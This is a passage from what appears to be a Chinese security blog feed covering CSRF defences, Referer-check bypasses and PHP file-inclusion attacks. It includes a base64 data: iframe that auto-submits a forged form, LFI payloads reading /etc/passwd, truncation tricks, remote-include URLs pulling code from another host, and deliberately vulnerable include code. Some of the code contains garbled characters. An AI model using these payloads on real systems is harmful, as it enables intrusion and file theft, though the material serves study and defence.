&quot;cookiename=cookievalue;HttpOnly&quot;);</code></p>\n<h2 id=\"增加token\"><a class=\"anchor\" href=\"#增加token\">#</a> 增加 token</h2>\n<p>CSRF 攻击之所以能够成功，是因为攻击者可以伪造用户的请求，该请求中所有的用户验证信息都存在于 cookie 中，因此攻击者可以在不知道用户验证信息的情况下直接利用用户的 cookie 来通过安全验证。由此可知，抵御 CSRF 攻击的关键在于：在请求中放入攻击者所不能伪造的信息，并且该信总不存在于 cookie 之中。鉴于此，系统开发人员可以在 HTTP 请求中以参数的形式加入一个随机产生的 token，并在服务端进行 token 校验，如果请求中没有 token 或者 token 内容不正确，则认为是 CSRF 攻击而拒绝该请求。<br />\n假设请求通过 POST 方式提交，则可以在相应的表单中增加一个隐藏域：<br />\n <code>&lt;input type=&quot;hidden&quot; name=&quot;_toicen&quot; value=&quot;tokenvalue&quot;/&gt;</code> <br />\ntoken 的值通过服务端生成，表单提交后 token 的值通过 POST 请求与参数一同带到服务端，每次会话可以使用相同的 token，会话过期，则 token 失效，攻击者因无法获取到 token，也就无法伪造请求。<br />\n在 session 中添加 token 的实现代码：</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>HttpSession session <span class=\"token operator\">=</span> request<span class=\"token operator\">.</span><span class=\"token function\">getSession</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword type-declaration\">Object</span> token <span class=\"token operator\">=</span> session<span class=\"token operator\">.</span><span class=\"token function\">getAttribute</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"_token\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span>token <span class=\"token operator\">==</span> <span class=\"token constant\">null</span> <span class=\"token constant\">I</span> <span class=\"token constant\">I</span> <span class=\"token string double-quoted-string\">\"\"</span><span class=\"token operator\">.</span><span class=\"token function\">equals</span><span class=\"token punctuation\">(</span>token<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    session<span class=\"token operator\">.</span><span class=\"token function\">setAttribute</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"_token\"</span><span class=\"token punctuation\">,</span> <span class=\"token constant\">UUID</span><span class=\"token operator\">.</span>randomUUIDO <span class=\"token operator\">.</span><span class=\"token function\">toString</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><h2 id=\"通过referer识别\"><a class=\"anchor\" href=\"#通过referer识别\">#</a> 通过 Referer 识别</h2>\n<p>根据 HTTP 协议，在 HTTP 头中有一个字段叫 Referer，它记录了该 HTTP 请求的来源地址。在通常情况下，访问一个安全受限的页面的请求都来自于同一个网站。比如某银行的转账是通过用户访问 <code>http://www.xxx.com/transfer.do</code>  页面完成的，用户必须先登录 <code>www.xxx.com</code> ，然后通过单击页面上的提交按钮来触发转账事件。当用户提交请求时，该转账请求的 Referer 值就会是<br />\n提交按钮所在页面的 URL（本例为 <code>www.xxx. com/transfer.do</code> ）。如果攻击者要对银行网站实施 CSRF 攻击，他只能在其他网站构造请求，当用户通过其他网站发送请求到银行时，该请求的 Referer 的值是其他网站的地址，而不是银行转账页面的地址。因此，要防御 CSRF 攻击，银行网站只需要对于每一个转账请求验证其 Referer 值即可，如果是以 <code>www.xx.om</code>  域名开头的地址，则说明该请求是来自银行网站自己的请求，是合法的；如果 Referer 是其他网站，就有可能是 CSRF 攻击，则拒绝该请求。<br />\n取得 HTTP 请求 Referer：<br />\n <code>String referer = request.getHeader(&quot;Referer&quot;);</code></p>\n<h1 id=\"csrf-绕过referer技巧\"><a class=\"anchor\" href=\"#csrf-绕过referer技巧\">#</a> CSRF-- 绕过 Referer 技巧</h1>\n<p>CSRF 遇到 Referer 绕过的情况，有条件限制，不一定所有的 Refere 验证就可以绕过</p>\n<h2 id=\"referer条件为空条件时\"><a class=\"anchor\" href=\"#referer条件为空条件时\">#</a> referer 条件为空条件时</h2>\n<p>解决方案:</p>\n<p>利用 <code>ftp://, http://, https://, file://, javascript:, data: </code> <br />\n这个时候浏览器地址栏是 <code>file://</code>  开头的，如果这个 HTML 页面向任何 http 站点提交请求的话，这些请求的 Referer 都是空的。</p>\n<p><span class=\"label\">例:</span></p>\n<ol>\n<li>利用 data: 协议</li>\n</ol>\n<figure class=\"highlight html\"><figcaption data-lang=\"HTML\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>html</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>body</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>iframe</span> <span class=\"token attr-name\">src</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>data:text/html;base64,PGZvcm0gbWV0aG9kPXBvc3QgYWN0aW9uPWh0dHA6Ly9hLmIuY29tL2Q+PGlucHV0IHR5cGU9dGV4dCBuYW1lPSdpZCcgdmFsdWU9JzEyMycvPjwvZm9ybT48c2NyaXB0PmRvY3VtZW50LmZvcm1zWzBdLnN1Ym1pdCgpOzwvc2NyaXB0Pg==<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>body</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>html</span><span class=\"token punctuation\">></span></span></pre></td></tr></table></figure><p>bese64 编码 解码即可看到代码</p>\n<ol start=\"2\">\n<li>利用 https 协议</li>\n</ol>\n<p>https 向 http 跳转的时候 Referer 为空<br />\n拿一个 https 的 webshell<br />\n <code>&lt;iframe src=&quot;https://xxxxx.xxxxx/attack.php&quot;&gt;</code></p>\n<p>attack.php 写上 CSRF 攻击代码</p>\n<h2 id=\"判断referer是某域情况下绕过\"><a class=\"anchor\" href=\"#判断referer是某域情况下绕过\">#</a> 判断 Referer 是某域情况下绕过</h2>\n<p>比如你找的 csrf 是 <code>http://xxx.com</code>  验证的 referer 是验证的 <code>*.http://xx.com</code>  可以找个二级域名 之后 <code>&lt;img &quot;csrf地址&quot;&gt;</code>  之后在把文章地址发出去 就可以伪造。</p>\n<h2 id=\"判断referer是否存在某关键字\"><a class=\"anchor\" href=\"#判断referer是否存在某关键字\">#</a> 判断 referer 是否存在某关键字</h2>\n<p>referer 判断存在不存在 <code>http://google.com</code>  这个关键词</p>\n<p>在网站新建一个 <code>http://google.com</code>  目录 把 CSRF 存放在 <code>http://google.com</code>  目录，即可绕过</p>\n<h2 id=\"判断referer是否含有某域名\"><a class=\"anchor\" href=\"#判断referer是否含有某域名\">#</a> 判断 referer 是否含有某域名</h2>\n<p>判断了 Referer 开头是否以 <code>http://126.com</code>  以及 126 子域名 不验证根域名为 <code>http://126.com</code>  那么我这里可以构造子域名 <code>http://x.126.com.xxx.com</code>  作为蠕虫传播的载体服务器，即可绕过。</p>\n<h1 id=\"reference\"><a class=\"anchor\" href=\"#reference\">#</a> Reference</h1>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuamlhbnNodS5jb20vcC82NzQwOGQ3M2M2NmQ=\">https://www.jianshu.com/p/67408d73c66d</span><br />\n<span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNjA2OTczL2FydGljbGUvZGV0YWlscy84NjUwNDc0Nw==\">https://blog.csdn.net/qq_41606973/article/details/86504747</span><br />\n<span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRjaGF0LmNzZG4ubmV0L2FjdGl2aXR5LzVhMGJhMzQ3ZTFmNzU1NTcxNDgzZWE1YQ==\">https://gitchat.csdn.net/activity/5a0ba347e1f755571483ea5a</span><br />\n<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vRmx1b3Jlc2NlbmNlLXRqeS9wLzYxMDAzMTAuaHRtbA==\">https://www.cnblogs.com/Fluorescence-tjy/p/6100310.html</span></p>\n",
            "tags": [
                "CSRF"
            ]
        },
        {
            "id": "https://or0kit.github.io/PenetrationTest/Web-Security/web%E6%BC%8F%E6%B4%9E-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/",
            "url": "https://or0kit.github.io/PenetrationTest/Web-Security/web%E6%BC%8F%E6%B4%9E-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/",
            "title": "web漏洞-文件包含",
            "date_published": "2021-01-20T04:12:47.000Z",
            "content_html": "<h1 id=\"文件包含漏洞简介\"><a class=\"anchor\" href=\"#文件包含漏洞简介\">#</a> 文件包含漏洞简介</h1>\n<ol>\n<li>\n<p>什么是文件包含漏洞？<br />\n程序开发人员通常会把可重复使用的函数写到单个文件中，在使用某些函数时，直接调用此文件，无需再次编写，这种调用文件的过程一般被称为文件包含。</p>\n</li>\n<li>\n<p>文件包含漏洞的成因<br />\n随着网站业务的需求，程序开发人员一般希望代码更灵活，所以将被包含的文件设置为<ins class=\"primary\">变量</ins>，用来进行动态调用，用户可以对<ins class=\"primary\">变量的值可控</ins>而服务器端未对变量值进行合理地校验或者校验被绕过，这样就导致了文件包含漏洞。通常文件包含漏洞出现在 PHP 语言中。</p>\n<ul>\n<li>php 中常见包含文件的函数\n<ul>\n<li>include () 当使用该函数包含文件时，只有代码执行到 include () 函数时才将文件包含进来，发生错误时之给出一个警告，继续<ins class=\"primary\">向下执行</ins>。</li>\n<li>include_once () 功能与 Include () 相同，区别在于当重复调用同一文件时，<ins class=\"primary\">程序只调用一次</ins></li>\n<li>require () require () 与 include () 的区别在于 require () 执行如果发生错误，函数会输出错误信息，并<ins class=\"primary\">终止脚本的运行</ins>。</li>\n<li>require_once () 功能与 require () 相同，区别在于当重复调用同一文件时，<ins class=\"primary\">程序只调用一次</ins></li>\n</ul>\n</li>\n</ul>\n</li>\n<li>\n<p>文件包含漏洞的分类</p>\n<p>文件包含漏洞可以分为 RFI (远程文件包含) 和 LFI（本地文件包含漏洞）两种。而区分他们最简单的方法就是 php.ini 中是否开启了 allow_url_include。如果开启 了我们就有可能包含远程文件。</p>\n<p>1、本地文件包含 LFI (Local File Include)</p>\n<p>2、远程文件包含 RFI (Remote File Include)（需要 php.ini 中 allow_url_include=on、allow_url_fopen = On）</p>\n<p>在 php.ini 中，allow_url_fopen 默认一直是 On，而 allow_url_include 从 php5.2 之后就默认为 Off。</p>\n</li>\n<li>\n<p>文件包含漏洞的危害</p>\n<ul>\n<li>配合文件上传漏洞 GetShell</li>\n<li>可以执行任意脚本代码</li>\n<li>网站源码文件以及配置文件泄露</li>\n<li>远程包含 GetShell</li>\n<li>控制整个网站甚至是服务器</li>\n</ul>\n</li>\n</ol>\n<h1 id=\"常见漏洞环境\"><a class=\"anchor\" href=\"#常见漏洞环境\">#</a> 常见漏洞环境</h1>\n<p>了解这些主要是为了绕过</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"><span>示例</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span> </pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span>page<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token punctuation\">&#123;</span> </pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token keyword\">include</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span>page<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token keyword\">include</span> <span class=\"token string single-quoted-string\">'show.php'</span><span class=\"token punctuation\">;</span> </pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token delimiter important\">?></span></span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span> </pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span>page<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    <span class=\"token keyword\">include</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'./action/'</span><span class=\"token operator\">.</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span>page<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    <span class=\"token keyword\">include</span> <span class=\"token string single-quoted-string\">'./action/show.php'</span><span class=\"token punctuation\">;</span> </pre></td></tr><tr><td data-num=\"18\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre><span class=\"token delimiter important\">?></span></span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre></pre></td></tr><tr><td data-num=\"21\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span> </pre></td></tr><tr><td data-num=\"22\"></td><td><pre><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span> <span class=\"token punctuation\">[</span>page<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre><span class=\"token punctuation\">&#123;</span> </pre></td></tr><tr><td data-num=\"24\"></td><td><pre>    <span class=\"token keyword\">include</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'./action/'</span><span class=\"token operator\">.</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span>page<span class=\"token punctuation\">]</span><span class=\"token operator\">.</span><span class=\"token string single-quoted-string\">'.php'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre><span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>    <span class=\"token keyword\">include</span> <span class=\"token string single-quoted-string\">'./action/show.php'</span><span class=\"token punctuation\">;</span> </pre></td></tr><tr><td data-num=\"28\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre><span class=\"token delimiter important\">?></span></span></pre></td></tr></table></figure><h1 id=\"本地文件包含\"><a class=\"anchor\" href=\"#本地文件包含\">#</a> 本地文件包含</h1>\n<h2 id=\"无限制本地文件包含\"><a class=\"anchor\" href=\"#无限制本地文件包含\">#</a> 无限制本地文件包含</h2>\n<p>这种直接找我们到需要的文件路径，进行包含就行。</p>\n<p><span class=\"label\">示例</span></p>\n<p><img data-src=\"image001.png\" alt=\"\" /></p>\n<h2 id=\"有限制本地文件包含\"><a class=\"anchor\" href=\"#有限制本地文件包含\">#</a> 有限制本地文件包含</h2>\n<p>这种类型需要我们找到的敏感文件路径，然后<ins class=\"info\">绕过限制</ins>进行包含就行。</p>\n<h3 id=\"00截断\"><a class=\"anchor\" href=\"#00截断\">#</a> %00 截断</h3>\n<p>条件：magic_quotes_gpc = Off php 版本 &lt; 5.3.4</p>\n<p>在上面常见环境代码的后两种都得用 %00 截断</p>\n<p><span class=\"label warning\">示例</span><br />\n <code>http://www.xxx.com/xx.php?filename=../../etc/passwd%00</code></p>\n<h3 id=\"路径长度截断\"><a class=\"anchor\" href=\"#路径长度截断\">#</a> 路径长度截断</h3>\n<p>条件：windows OS，点号需要长于 256；linux OS 长于 4096</p>\n<p>Windows 下目录最大长度为 256 字节，超出的部分会被丢弃；</p>\n<p>Linux 下目录最大长度为 4096 字节，超出的部分会被丢弃。</p>\n<p>测试代码：</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token variable\">$filename</span>  <span class=\"token operator\">=</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'filename'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token keyword\">include</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$filename</span> <span class=\"token operator\">.</span> <span class=\"token string double-quoted-string\">\".html\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token delimiter important\">?></span></span></pre></td></tr></table></figure><div class=\"tab\" data-id=\"id1\" data-title=\"EXP:\">\n<p><span class=\"exturl\" data-url=\"aHR0cDovL3d3dy5jdGZzLXdpa2kuY29tL0ZJL0ZJLnBocD9maWxlbmFtZT10ZXN0LnR4dC8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8=\">http://www.ctfs-wiki.com/FI/FI.php?filename=test.txt/./././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././/././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././/././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././/././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././/./././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././</span></p>\n</div>\n<p><img data-src=\"image008.png\" alt=\"\" /></p>\n<h3 id=\"点号截断\"><a class=\"anchor\" href=\"#点号截断\">#</a> 点号截断</h3>\n<p>条件：windows OS，点号需要长于 256</p>\n<p>测试代码：</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token variable\">$filename</span>  <span class=\"token operator\">=</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'filename'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token keyword\">include</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$filename</span> <span class=\"token operator\">.</span> <span class=\"token string double-quoted-string\">\".html\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token delimiter important\">?></span></span></pre></td></tr></table></figure><div class=\"tab\" data-id=\"id2\" data-title=\"EXP:\">\n<p><span class=\"exturl\" data-url=\"aHR0cDovL3d3dy5jdGZzLXdpa2kuY29tL0ZJL0ZJLnBocD9maWxlbmFtZT10ZXN0LnR4dA==\">http://www.ctfs-wiki.com/FI/FI.php?filename=test.txt</span>.................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................</p>\n</div>\n<h1 id=\"远程文件包含\"><a class=\"anchor\" href=\"#远程文件包含\">#</a> 远程文件包含</h1>\n<p>PHP 的配置文件 allow_url_fopen 和 allow_url_include 设置为 ON，include/require 等包含函数可以加载远程文件，如果远程文件没经过严格的过滤，导致了执行恶意文件的代码，这就是远程文件包含漏洞。</p>\n<div class=\"note info\">\n<p>allow_url_fopen = On（是否允许打开远程文件）<br />\nallow_url_include = On（是否允许 include/require 远程文件）</p>\n</div>\n<h2 id=\"无限制远程文件包含\"><a class=\"anchor\" href=\"#无限制远程文件包含\">#</a> 无限制远程文件包含</h2>\n<p>和无限制本地文件包含差不多。不再介绍（懒蛋。。）<br />\n<img data-src=\"image009.png\" alt=\"\" /></p>\n<h2 id=\"有限制远程文件包含\"><a class=\"anchor\" href=\"#有限制远程文件包含\">#</a> 有限制远程文件包含</h2>\n<p>测试代码：</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span> </pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">include</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'filename'</span><span class=\"token punctuation\">]</span><span class=\"token operator\">.</span> <span class=\"token string double-quoted-string\">\".html\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> </pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token delimiter important\">?></span></span></pre></td></tr></table></figure><p>代码中多添加了 html 后缀，导致远程包含的文件也会多一个 html 后缀。</p>\n<h3 id=\"绕过姿势\"><a class=\"anchor\" href=\"#绕过姿势\">#</a> 绕过姿势</h3>\n<ol>\n<li>\n<p>问号绕过<br />\n <code>http://192.168.199.130/test.php?filename=http://192.168.199.131/php.txt?</code> <br />\n<img data-src=\"image012.png\" alt=\"\" /></p>\n</li>\n<li>\n<p>#号绕过<br />\n <code>http://192.168.199.130/test.php?filename=http://192.168.199.131/php.txt%23</code> <br />\n<img data-src=\"image011.png\" alt=\"\" /></p>\n</li>\n<li>\n<p>空格 (%20) 绕过<br />\n <code>http://192.168.199.130/test.php?filename=http://192.168.199.131/php.txt%20</code> <br />\n<img data-src=\"image010.png\" alt=\"\" /></p>\n</li>\n</ol>\n<h1 id=\"php伪协议\"><a class=\"anchor\" href=\"#php伪协议\">#</a> PHP 伪协议</h1>\n<p>PHP 带有很多内置 URL 风格的封装协议，可用于类似 fopen ()、 copy ()、 file_exists () 和 filesize () 的文件系统函数。 除了这些封装协议，还能通过 stream_wrapper_register () 来注册自定义的封装协议。</p>\n<p>支持的种类有这 12 种</p>\n<ul>\n<li>file:// — 